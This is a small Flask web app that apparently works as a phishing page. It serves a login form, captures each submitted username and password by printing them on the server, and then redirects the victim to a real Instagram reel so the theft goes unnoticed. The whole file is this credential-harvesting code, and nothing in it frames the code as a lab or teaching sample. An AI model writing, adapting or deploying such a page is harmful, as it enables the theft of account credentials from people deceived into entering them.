from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    print(username, password)

    return redirect("https://www.instagram.com/reel/DRYNGtyDPxx/?igsh=MXRjZjF3NGRmbWhkbQ==")
